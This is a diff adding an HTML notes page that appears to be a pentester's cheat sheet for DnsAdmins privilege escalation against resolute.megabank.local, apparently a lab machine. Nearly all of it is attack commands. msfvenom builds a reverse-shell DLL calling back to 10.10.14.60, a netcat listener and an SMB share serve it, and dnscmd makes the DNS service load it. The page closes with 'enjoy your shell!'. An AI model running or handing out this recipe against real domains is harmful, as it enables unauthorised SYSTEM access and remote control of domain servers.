@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>dns admins</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>dns admins</h1><br/>whoami /groups<br />    dnsadmins<br />    <br />msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f dll &gt; yee.dll<br />nc -nlvp 3232<br />sudo bash<br />smbserver.py yeet `pwd`<br /><br />net view \\10.10.14.60<br />dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.60\yeet\yee.dll<br />sc.exe stop dns<br />sc.exe start dns<br />sc.exe query dns<br />...enjoy your shell!<br /><br /><br /><br /><br /><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2</a></div></body></html>
